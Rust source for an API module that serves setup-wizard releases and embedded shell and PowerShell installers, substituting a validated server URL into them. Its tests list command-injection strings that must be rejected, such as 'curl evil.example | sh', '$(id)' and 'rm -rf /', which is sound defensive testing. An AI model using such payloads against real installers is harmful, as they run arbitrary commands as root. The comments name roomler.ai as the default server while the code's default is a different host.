// SPDX-License-Identifier: AGPL-3.0-only
// Copyright (C) 2026 G ROX EOOD
//! `/api/setup/*` — cached GitHub-Releases proxy for the unified
//! `roomler-setup` wizard (tag `setup-v*`, asset prefix
//! `roomler-setup-`) plus the terminal installers
//! `/api/setup/install.{sh,ps1}`. Renamed from
//! `tunnel_wizard_release.rs` in P4b; the legacy `/api/tunnel-wizard/*`
//! family it also served was retired in P4c-2 (its release family
//! stopped at tunnel-wizard-v0.3.0-rc.59 and had been 404ing off the
//! release-page window for months).
//!
//! `GET /api/setup/{latest-release,{platform}/health,{platform}}` —
//! latest-release returns the `setup-v*`-filtered list; health
//! resolves a platform asset manifest; the bare platform route
//! streams the artifact bytes.
//!
//! Parallel to [`crate::tunnel_release`] (bare CLI tarball)
//! and [`crate::agent_release`] (agent MSIs).

use axum::{
    Json,
    body::Body,
    extract::{Path, Query, State},
    http::{HeaderMap, StatusCode},
    response::Response,
};
use serde::{Deserialize, Serialize};
use std::{borrow::Cow, time::Duration};

use roomler_core::{ApiError, client_ip::PeerAddr};

use crate::{
    FleetState,
    agent_release::{AgentRelease, AgentReleaseAsset},
    install_trace, releases,
};

#[derive(Deserialize)]
pub struct InstallerQuery {
    #[serde(default = "default_version_latest")]
    pub version: String,
}

fn default_version_latest() -> String {
    "latest".to_string()
}

#[derive(Debug, Serialize)]
pub struct InstallerHealth {
    pub tag: String,
    pub platform: String,
    pub filename: String,
    pub size: u64,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub digest: Option<String>,
    pub uri: String,
}

// ─── /api/setup — the unified roomler-setup wizard ──────────────────────────

/// `GET /api/setup/latest-release` — recent `setup-v*` releases ONLY
/// (filtered server-side from the mixed tag list the cache holds).
pub async fn setup_latest_release(
    State(state): State<FleetState>,
    PeerAddr(peer): PeerAddr,
    headers: HeaderMap,
) -> Result<Json<Vec<AgentRelease>>, ApiError> {
    // FR-102 P3 — counted by client class; see `install_trace`.
    install_trace::count_fetch(
        &state,
        &headers,
        peer,
        install_trace::asset::SETUP_LATEST_RELEASE,
    );
    let base = crate::release_delivery::public_base(&state.settings.app.frontend_url)?;
    let releases = releases::cached(&state).await?;
    let filtered: Vec<AgentRelease> = releases
        .into_iter()
        .filter(|r| r.tag_name.starts_with("setup-v"))
        .collect();
    Ok(Json(crate::release_delivery::own_urls(filtered, &base)?))
}

/// `GET /api/setup/{platform}/health` — manifest for the unified
/// wizard EXE matching the requested platform + version. 404s until
/// P4c tags the first `setup-v*` release.
pub async fn setup_installer_health(
    State(state): State<FleetState>,
    Path(platform): Path<String>,
    Query(params): Query<InstallerQuery>,
) -> Result<Json<InstallerHealth>, ApiError> {
    let normalised = normalise_platform(&platform)?;
    crate::release_delivery::validate_version(&params.version)?;
    let releases = releases::cached(&state).await?;
    let release = pick_release_for(&releases, &params.version, "setup-v").ok_or_else(|| {
        ApiError::NotFound(format!(
            "no setup release matching version={}",
            params.version
        ))
    })?;
    let asset = pick_setup_asset(&release.assets, normalised).ok_or_else(|| {
        ApiError::NotFound(format!(
            "no setup asset for platform {} in tag {}",
            normalised, release.tag_name
        ))
    })?;
    crate::release_delivery::validate_asset(release, asset)?;
    Ok(Json(InstallerHealth {
        tag: release.tag_name.clone(),
        platform: normalised.to_string(),
        filename: asset.name.clone(),
        size: asset.size,
        digest: asset.digest.clone(),
        uri: crate::release_delivery::health_uri(
            &format!("/api/setup/{}", normalised),
            &release.tag_name,
        ),
    }))
}

/// `GET /api/setup/{platform}` — streams the unified wizard bytes.
pub async fn setup_installer_proxy(
    State(state): State<FleetState>,
    Path(platform): Path<String>,
    Query(params): Query<InstallerQuery>,
    PeerAddr(peer): PeerAddr,
    headers: HeaderMap,
) -> Result<Response, ApiError> {
    let normalised = normalise_platform(&platform)?;
    crate::release_delivery::validate_version(&params.version)?;
    // FR-102 P3 — the wizard archive itself, usually a browser on the site.
    install_trace::count_fetch(
        &state,
        &headers,
        peer,
        &install_trace::asset::setup(normalised),
    );
    let releases = releases::cached(&state).await?;
    let release = pick_release_for(&releases, &params.version, "setup-v").ok_or_else(|| {
        ApiError::NotFound(format!(
            "no setup release matching version={}",
            params.version
        ))
    })?;
    let asset = pick_setup_asset(&release.assets, normalised).ok_or_else(|| {
        ApiError::NotFound(format!(
            "no setup asset for platform {} in tag {}",
            normalised, release.tag_name
        ))
    })?;

    stream_asset(release, asset).await
}

/// Pick the unified-wizard asset for a platform. Asset naming follows
/// the release-setup.yml matrix with the `roomler-setup-` prefix:
///   - linux-x86_64 — `roomler-setup-*-x86_64-unknown-linux-gnu.tar.gz`
///   - linux-aarch64 — `roomler-setup-*-aarch64-unknown-linux-gnu.tar.gz` (FR-97 P7b)
///   - macos — `roomler-setup-*-universal-apple-darwin.tar.gz`
///   - windows-x86_64 — `roomler-setup-*-x86_64-pc-windows-msvc.zip`
///
/// Each arm names its own target triple, so neither Linux arm can take the
/// other's tarball whatever order GitHub lists them in.
pub fn pick_setup_asset<'a>(
    assets: &'a [AgentReleaseAsset],
    platform: &str,
) -> Option<&'a AgentReleaseAsset> {
    assets.iter().find(|a| {
        let name = a.name.to_ascii_lowercase();
        if name.ends_with(".sha256") {
            return false;
        }
        if !name.starts_with("roomler-setup-") {
            return false;
        }
        match platform {
            "linux-x86_64" => {
                name.contains("x86_64-unknown-linux-gnu") && name.ends_with(".tar.gz")
            }
            "linux-aarch64" => {
                name.contains("aarch64-unknown-linux-gnu") && name.ends_with(".tar.gz")
            }
            "macos" => name.contains("universal-apple-darwin") && name.ends_with(".tar.gz"),
            "windows-x86_64" => name.contains("x86_64-pc-windows-msvc") && name.ends_with(".zip"),
            _ => false,
        }
    })
}

/// The terminal-driven installers (scripts/install.sh + install.ps1),
/// embedded at COMPILE time so the API serves them with no runtime
/// filesystem dependency. Canonical usage:
///
///   curl -fsSL https://roomler.ai/api/setup/install.sh | sh -s -- \
///       --role daemon --token <jwt>
///
/// and the PowerShell twin via `/api/setup/install.ps1`. These are the
/// no-GUI equivalent of the roomler-setup wizard (same resolve →
/// download → verify → install → enroll steps). Short cache so script
/// fixes roll out within minutes of a web deploy.
const INSTALL_SH: &str = include_str!("../../../../scripts/install.sh");
const INSTALL_PS1: &str = include_str!("../../../../scripts/install.ps1");

/// FR-50 — the exact text of each script's server default, held here so the
/// route can substitute the server that is actually serving the script.
///
/// A piped installer cannot see the URL it was fetched from: `curl … | sh` has
/// no `$0`, no filename and no referrer. So without this a self-hosted
/// deployment hands out a script that downloads the agent from the self-hosted
/// server (that part is parameterised and works) and then enrols it against
/// `roomler.ai` — which rejects a token only the self-hosted server can verify,
/// with an error that names the token rather than the server.
///
/// ⚠️ Asserted to appear EXACTLY ONCE in each embedded script by
/// `the_server_default_is_substitutable_exactly_once`. A blind `replace` on a
/// shell script is a silent-failure machine: edit the line and the server keeps
/// serving the old default with nothing failing anywhere. The test is what
/// makes that a build error instead.
const SERVER_NEEDLE_SH: &str = "SERVER=\"https://www.itachi.fans/meshharbor\"";
const SERVER_NEEDLE_PS1: &str = "[string]$Server = 'https://www.itachi.fans/meshharbor',";

/// The deployment base to substitute, or `None` to serve the script unchanged.
///
/// ⚠️ The result is spliced into a shell double-quoted string and a PowerShell
/// single-quoted string, inside a script that then runs as **root / SYSTEM**. A
/// value carrying `"`, `$`, a backtick, a quote or a newline would be command
/// injection into an installer, authored by whoever can set an env var on the
/// API process. So this is a narrow POSITIVE match — scheme, host, optional
/// port, safe deployment path segments and an optional trailing slash. Anything else is
/// refused rather than escaped.
///
/// Refusing is always safe: serving the compiled-in default is exactly the
/// behaviour every deployment had before this existed.
fn substitutable_origin(frontend_url: &str) -> Option<String> {
    let raw = frontend_url.trim();
    let scheme = if raw.starts_with("https://") {
        "https"
    } else if raw.starts_with("http://") {
        "http"
    } else {
        return None;
    };
    let rest = &raw[scheme.len() + 3..];
    // A deployment prefix belongs before the appended `/api/...` path. Keep
    // it verbatim, but permit only shell-literal-safe, non-traversing segments.
    let base = rest.strip_suffix('/').unwrap_or(rest);
    let (hostport, prefix) = base.split_once('/').unwrap_or((base, ""));
    if base.len() > 2048
        || (base.contains('/')
            && prefix.split('/').any(|segment| {
                segment.is_empty()
                    || segment == "."
                    || segment == ".."
                    || !segment.bytes().all(|b| {
                        b.is_ascii_alphanumeric() || matches!(b, b'-' | b'_' | b'.' | b'~')
                    })
            }))
    {
        return None;
    }
    if hostport.is_empty() || hostport.len() > 253 {
        return None;
    }
    let (host, port) = match hostport.rsplit_once(':') {
        Some((h, p)) => (h, Some(p)),
        None => (hostport, None),
    };
    if host.is_empty()
        || !host
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || b == b'.' || b == b'-' || b == b'_')
    {
        return None;
    }
    if let Some(p) = port
        && (p.is_empty() || p.len() > 5 || !p.bytes().all(|b| b.is_ascii_digit()))
    {
        return None;
    }
    Some(format!("{scheme}://{base}"))
}

/// Substitute `needle`'s embedded default for this deployment's own origin, or
/// hand back the script untouched when the origin is unusable or identical.
///
/// Borrows in the identical case on purpose: the hosted service's
/// `frontend_url` is the compiled-in MeshHarbor center, so the common path
/// allocates nothing and serves byte-identical bytes.
fn with_server_default<'a>(
    script: &'a str,
    needle: &str,
    render: impl Fn(&str) -> String,
    frontend_url: &str,
) -> Cow<'a, str> {
    let Some(origin) = substitutable_origin(frontend_url) else {
        tracing::warn!(
            frontend_url,
            "install script: app.frontend_url is not a safe deployment base, \
             serving the compiled-in server default unchanged — a device installed \
             from this server will use the compiled-in MeshHarbor center unless --server is passed"
        );
        return Cow::Borrowed(script);
    };
    let replacement = render(&origin);
    if replacement == needle {
        return Cow::Borrowed(script);
    }
    Cow::Owned(script.replacen(needle, &replacement, 1))
}

fn script_response(body: Cow<'static, str>, content_type: &'static str) -> Response {
    let bytes = body.into_owned();
    Response::builder()
        .status(StatusCode::OK)
        .header("Content-Type", content_type)
        // Still cacheable: the body varies per SERVER, not per request, so a
        // cache in front of one deployment only ever holds that deployment's
        // script. No `Vary` — nothing here reads a request header.
        .header("Cache-Control", "public, max-age=300")
        .body(Body::from(bytes.clone()))
        .unwrap_or_else(|_| Response::new(Body::from(bytes)))
}

/// `GET /api/setup/install.sh` — the Linux/macOS terminal installer.
pub async fn install_script_sh(
    State(state): State<FleetState>,
    PeerAddr(peer): PeerAddr,
    headers: HeaderMap,
) -> Response {
    // FR-102 P3 — a fetch of the script, by client class (curl, a browser…).
    install_trace::count_fetch(&state, &headers, peer, install_trace::asset::INSTALL_SH);
    let body = with_server_default(
        INSTALL_SH,
        SERVER_NEEDLE_SH,
        |o| format!("SERVER=\"{o}\""),
        &state.settings.app.frontend_url,
    );
    script_response(body, "text/x-shellscript; charset=utf-8")
}

/// `GET /api/setup/install.ps1` — the Windows terminal installer.
pub async fn install_script_ps1(
    State(state): State<FleetState>,
    PeerAddr(peer): PeerAddr,
    headers: HeaderMap,
) -> Response {
    install_trace::count_fetch(&state, &headers, peer, install_trace::asset::INSTALL_PS1);
    let body = with_server_default(
        INSTALL_PS1,
        SERVER_NEEDLE_PS1,
        |o| format!("[string]$Server = '{o}',"),
        &state.settings.app.frontend_url,
    );
    script_response(body, "text/plain; charset=utf-8")
}

/// Stream a release asset's bytes through the proxy with download
/// headers.
async fn stream_asset(
    release: &AgentRelease,
    asset: &AgentReleaseAsset,
) -> Result<Response, ApiError> {
    crate::release_delivery::stream_asset(release, asset, content_type_for(&asset.name)).await
}

#[cfg(test)]
fn sanitise_header_value(s: &str) -> String {
    s.chars()
        .filter(|c| !matches!(c, '\r' | '\n' | '"'))
        .collect()
}

fn content_type_for(filename: &str) -> &'static str {
    let lower = filename.to_ascii_lowercase();
    if lower.ends_with(".tar.gz") || lower.ends_with(".tgz") {
        "application/gzip"
    } else if lower.ends_with(".zip") {
        "application/zip"
    } else if lower.ends_with(".exe") {
        "application/vnd.microsoft.portable-executable"
    } else {
        "application/octet-stream"
    }
}

fn normalise_platform(s: &str) -> Result<&'static str, ApiError> {
    match s.to_ascii_lowercase().as_str() {
        // The bare `linux` stays x86_64: every link handed out before FR-97
        // P7b says `/api/setup/linux` and means that one.
        "linux-x86_64" | "linux" | "linux-tar" => Ok("linux-x86_64"),
        // FR-97 P7b — what an aarch64 wizard names itself
        // (`roomler_setup_core::asset_resolver::current_platform`).
        "linux-aarch64" | "linux-arm64" => Ok("linux-aarch64"),
        "macos" | "macos-universal" | "darwin" => Ok("macos"),
        "windows-x86_64" | "windows" | "win" => Ok("windows-x86_64"),
        other => Err(ApiError::BadRequest(format!(
            "unknown platform {other:?}; expected one of linux-x86_64 / linux-aarch64 / macos / windows-x86_64"
        ))),
    }
}

/// Pick a release for a given tag family. `version == "latest"`
/// prefers stable over prerelease within the family; an explicit
/// version matches with or without the family prefix.
fn pick_release_for<'a>(
    releases: &'a [AgentRelease],
    version: &str,
    tag_prefix: &str,
) -> Option<&'a AgentRelease> {
    if version == "latest" {
        releases
            .iter()
            .find(|r| !r.draft && !r.prerelease && r.tag_name.starts_with(tag_prefix))
            .or_else(|| {
                releases
                    .iter()
                    .find(|r| !r.draft && r.tag_name.starts_with(tag_prefix))
            })
    } else {
        let target_with_prefix = format!("{tag_prefix}{}", version.trim_start_matches(tag_prefix));
        let target_bare = version.trim_start_matches(tag_prefix);
        releases.iter().find(|r| {
            r.tag_name == target_with_prefix || r.tag_name == target_bare || r.tag_name == version
        })
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn asset(name: &str) -> AgentReleaseAsset {
        AgentReleaseAsset {
            name: name.to_string(),
            browser_download_url: format!("https://example.com/{name}"),
            size: 1024,
            digest: None,
        }
    }

    fn release(tag: &str, prerelease: bool, asset_names: &[&str]) -> AgentRelease {
        AgentRelease {
            tag_name: tag.to_string(),
            draft: false,
            prerelease,
            published_at: None,
            assets: asset_names.iter().map(|n| asset(n)).collect(),
        }
    }

    #[test]
    fn normalise_platform_accepts_aliases() {
        assert_eq!(normalise_platform("linux").unwrap(), "linux-x86_64");
        assert_eq!(normalise_platform("LINUX-X86_64").unwrap(), "linux-x86_64");
        assert_eq!(
            normalise_platform("linux-aarch64").unwrap(),
            "linux-aarch64"
        );
        assert_eq!(normalise_platform("Linux-ARM64").unwrap(), "linux-aarch64");
        assert_eq!(normalise_platform("Darwin").unwrap(), "macos");
        assert_eq!(normalise_platform("WIN").unwrap(), "windows-x86_64");
    }

    /// FR-97 P7b — the two Linux tarballs never stand in for each other, in
    /// either listing order (GitHub's order is the upload order, which this
    /// code does not control).
    #[test]
    fn pick_setup_asset_keeps_the_linux_arches_apart() {
        let x86 = "roomler-setup-0.4.148-x86_64-unknown-linux-gnu.tar.gz";
        let arm = "roomler-setup-0.4.148-aarch64-unknown-linux-gnu.tar.gz";
        for order in [[arm, x86], [x86, arm]] {
            let assets: Vec<_> = order.iter().map(|n| asset(n)).collect();
            assert_eq!(pick_setup_asset(&assets, "linux-x86_64").unwrap().name, x86);
            assert_eq!(
                pick_setup_asset(&assets, "linux-aarch64").unwrap().name,
                arm
            );
        }
        // A release from before P7b has no aarch64 wizard: a clean 404, never
        // the x86_64 tarball.
        let before = vec![asset(x86)];
        assert!(pick_setup_asset(&before, "linux-aarch64").is_none());
        assert!(pick_setup_asset(&[asset(arm)], "linux-x86_64").is_none());
    }

    #[test]
    fn normalise_platform_rejects_deb_for_wizard() {
        // The wizard EXE isn't packaged as a .deb (operators run it
        // interactively, not via dpkg). Reject the alias outright so
        // a confused caller gets a clear error instead of a 404 on
        // pick_setup_asset.
        assert!(normalise_platform("linux-deb").is_err());
        assert!(normalise_platform("deb").is_err());
    }

    #[test]
    fn normalise_platform_rejects_unknown() {
        assert!(normalise_platform("freebsd").is_err());
        assert!(normalise_platform("").is_err());
    }

    #[test]
    fn pick_release_latest_falls_back_to_prerelease_when_no_stable() {
        let releases = vec![
            release("setup-v0.3.0-rc.1", true, &[]),
            release("agent-v0.3.0", false, &[]),
        ];
        let picked = pick_release_for(&releases, "latest", "setup-v").unwrap();
        assert_eq!(picked.tag_name, "setup-v0.3.0-rc.1");
    }

    #[test]
    fn pick_release_specific_version_accepts_with_or_without_prefix() {
        let releases = vec![release("setup-v0.3.0-rc.1", false, &[])];
        assert!(pick_release_for(&releases, "0.3.0-rc.1", "setup-v").is_some());
        assert!(pick_release_for(&releases, "setup-v0.3.0-rc.1", "setup-v").is_some());
        assert!(pick_release_for(&releases, "0.99.0", "setup-v").is_none());
    }

    #[test]
    fn pick_release_for_setup_prefix_ignores_other_families() {
        let releases = vec![
            release("agent-v0.3.0-rc.195", false, &[]),
            release("tunnel-wizard-v0.3.0-rc.59", false, &[]),
            release(
                "setup-v0.3.0-rc.200",
                false,
                &["roomler-setup-0.3.0-rc.200-x86_64-pc-windows-msvc.zip"],
            ),
        ];
        let picked = pick_release_for(&releases, "latest", "setup-v").unwrap();
        assert_eq!(picked.tag_name, "setup-v0.3.0-rc.200");
        // Dark until the family exists: no setup-v tag → None (the
        // handlers turn this into a clean 404).
        let none = pick_release_for(&releases[..2], "latest", "setup-v");
        assert!(none.is_none());
    }

    #[test]
    fn pick_setup_asset_requires_setup_prefix_and_matches_triples() {
        let assets = vec![
            // RETIRED-NAME-ANCHOR(26): roomler-tunnel-installer is a PUBLISHED
            // release asset (FR-21 D6). It appears twice in this test on
            // purpose: once in the candidate list and once alone, to prove the
            // legacy wizard asset can NEVER satisfy the setup pick.
            asset("roomler-tunnel-installer-0.3.0-x86_64-pc-windows-msvc.zip"),
            asset("roomler-setup-0.3.0-x86_64-pc-windows-msvc.zip"),
            asset("roomler-setup-0.3.0-x86_64-pc-windows-msvc.zip.sha256"),
            asset("roomler-setup-0.3.0-x86_64-unknown-linux-gnu.tar.gz"),
            asset("roomler-setup-0.3.0-universal-apple-darwin.tar.gz"),
        ];
        assert_eq!(
            pick_setup_asset(&assets, "windows-x86_64").unwrap().name,
            "roomler-setup-0.3.0-x86_64-pc-windows-msvc.zip"
        );
        assert_eq!(
            pick_setup_asset(&assets, "linux-x86_64").unwrap().name,
            "roomler-setup-0.3.0-x86_64-unknown-linux-gnu.tar.gz"
        );
        assert_eq!(
            pick_setup_asset(&assets, "macos").unwrap().name,
            "roomler-setup-0.3.0-universal-apple-darwin.tar.gz"
        );
        // The legacy wizard asset must never satisfy the setup pick.
        let legacy_only = vec![asset(
            "roomler-tunnel-installer-0.3.0-x86_64-pc-windows-msvc.zip",
        )];
        assert!(pick_setup_asset(&legacy_only, "windows-x86_64").is_none());
    }

    #[test]
    fn embedded_install_scripts_look_right() {
        // Shape locks on the compile-time-embedded terminal installers
        // — a broken include path or an emptied script fails here, not
        // in production.
        assert!(INSTALL_SH.starts_with("#!/bin/sh"), "install.sh shebang");
        assert!(INSTALL_SH.contains("/api/agent/latest-release"));
        assert!(INSTALL_SH.contains("--role"));
        assert!(INSTALL_PS1.contains("daemon-user"));
        assert!(INSTALL_PS1.contains("/api/agent/installer/"));
        assert!(INSTALL_PS1.contains("tunnel-client"));
        // The served scripts must never embed a JWT (base64url JWTs
        // start with "eyJ" — the {"typ"/{"alg" header).
        assert!(!INSTALL_SH.contains("eyJ"));
        assert!(!INSTALL_PS1.contains("eyJ"));
    }

    // ─── FR-50: the served script names the server that served it ──────────

    /// The lock that makes the substitution non-silent. Without it, editing
    /// either script's `SERVER=` line disables the rewrite and nothing fails —
    /// self-hosted installs quietly go back to enrolling against roomler.ai.
    #[test]
    fn the_server_default_is_substitutable_exactly_once() {
        assert_eq!(
            INSTALL_SH.matches(SERVER_NEEDLE_SH).count(),
            1,
            "install.sh must contain exactly one `{SERVER_NEEDLE_SH}` — if you \
             edited that line, update SERVER_NEEDLE_SH in the same commit"
        );
        assert_eq!(
            INSTALL_PS1.matches(SERVER_NEEDLE_PS1).count(),
            1,
            "install.ps1 must contain exactly one `{SERVER_NEEDLE_PS1}` — if you \
             edited that line, update SERVER_NEEDLE_PS1 in the same commit"
        );
    }

    #[test]
    fn substitutable_origin_accepts_a_plain_scheme_host_port() {
        for (input, want) in [
            ("https://roomler.ai", "https://roomler.ai"),
            ("https://roomler.ai/", "https://roomler.ai"),
            ("http://localhost:8080", "http://localhost:8080"),
            ("http://localhost:8080/", "http://localhost:8080"),
            (
                "https://my-roomler.example.com:8443",
                "https://my-roomler.example.com:8443",
            ),
            ("  https://roomler.ai  ", "https://roomler.ai"),
            (
                "https://www.itachi.fans/meshharbor",
                "https://www.itachi.fans/meshharbor",
            ),
            (
                "https://www.itachi.fans/meshharbor/",
                "https://www.itachi.fans/meshharbor",
            ),
            (
                "https://custom.example/customer/site-1_2.v3~",
                "https://custom.example/customer/site-1_2.v3~",
            ),
        ] {
            assert_eq!(
                substitutable_origin(input).as_deref(),
                Some(want),
                "{input} should substitute as {want}"
            );
        }
    }

    /// The security half. This value is spliced into a script that runs as
    /// root/SYSTEM, so anything outside the safe deployment-base grammar is
    /// REFUSED rather than escaped — a refusal serves the compiled-in default,
    /// which is exactly the behaviour before this existed.
    #[test]
    fn substitutable_origin_refuses_anything_that_could_be_injected() {
        for input in [
            // shell metacharacters, straight into a double-quoted string
            "https://roomler.ai\"; curl evil.example | sh; #",
            "https://roomler.ai$(id)",
            "https://roomler.ai`id`",
            "https://roomler.ai${IFS}",
            // PowerShell single-quote break-out
            "https://roomler.ai'; iex 'x",
            // newline — would append whole statements to the script
            "https://roomler.ai\nrm -rf /",
            // Paths must be literal-safe and cannot traverse or contain empty segments.
            "https://roomler.ai/base/../other",
            "https://roomler.ai/base/./other",
            "https://roomler.ai/base//other",
            "https://roomler.ai/base%2fother",
            "https://roomler.ai/base$(id)",
            "https://roomler.ai/base'; iex 'x",
            // userinfo, query, fragment
            "https://user:pw@roomler.ai",
            "https://roomler.ai?x=1",
            "https://roomler.ai#f",
            // wrong or missing scheme
            "ftp://roomler.ai",
            "roomler.ai",
            "//roomler.ai",
            "",
            "   ",
            "https://",
            "https:///",
            // malformed port
            "https://roomler.ai:",
            "https://roomler.ai:80a",
            "https://roomler.ai:123456",
        ] {
            assert_eq!(
                substitutable_origin(input),
                None,
                "{input:?} must be refused, not substituted"
            );
        }
    }

    #[test]
    fn a_self_hosted_origin_is_substituted_into_both_scripts() {
        let sh = with_server_default(
            INSTALL_SH,
            SERVER_NEEDLE_SH,
            |o| format!("SERVER=\"{o}\""),
            "http://localhost:8080",
        );
        assert!(sh.contains("SERVER=\"http://localhost:8080\""));
        assert!(
            !sh.contains(SERVER_NEEDLE_SH),
            "the roomler.ai default must be gone, not merely joined"
        );

        let ps1 = with_server_default(
            INSTALL_PS1,
            SERVER_NEEDLE_PS1,
            |o| format!("[string]$Server = '{o}',"),
            "http://localhost:8080",
        );
        assert!(ps1.contains("[string]$Server = 'http://localhost:8080',"));
        assert!(!ps1.contains(SERVER_NEEDLE_PS1));
    }

    /// The hosted service's own case, and the reason this ships without a
    /// staged rollout: the compiled-in center IS `https://www.itachi.fans/meshharbor`, so the
    /// bytes it serves do not change at all.
    #[test]
    fn the_hosted_origin_serves_the_script_byte_identical() {
        let sh = with_server_default(
            INSTALL_SH,
            SERVER_NEEDLE_SH,
            |o| format!("SERVER=\"{o}\""),
            "https://www.itachi.fans/meshharbor",
        );
        assert_eq!(sh.as_ref(), INSTALL_SH);
        assert!(matches!(sh, Cow::Borrowed(_)), "identical ⇒ no allocation");
    }

    /// A refused origin must leave the script alone rather than, say, blank
    /// the default — a broken installer is worse than one pointing at the
    /// wrong server, because the operator has nothing to override.
    #[test]
    fn a_refused_origin_serves_the_compiled_in_default() {
        let sh = with_server_default(
            INSTALL_SH,
            SERVER_NEEDLE_SH,
            |o| format!("SERVER=\"{o}\""),
            "https://roomler.ai\"; rm -rf /; #",
        );
        assert_eq!(sh.as_ref(), INSTALL_SH);
        assert!(sh.contains(SERVER_NEEDLE_SH));
    }

    #[test]
    fn content_type_for_known_extensions() {
        assert_eq!(content_type_for("foo.zip"), "application/zip");
        assert_eq!(content_type_for("foo.tar.gz"), "application/gzip");
        assert_eq!(content_type_for("foo.tgz"), "application/gzip");
        assert_eq!(
            content_type_for("foo.exe"),
            "application/vnd.microsoft.portable-executable"
        );
        assert_eq!(content_type_for("foo.bin"), "application/octet-stream");
    }
}
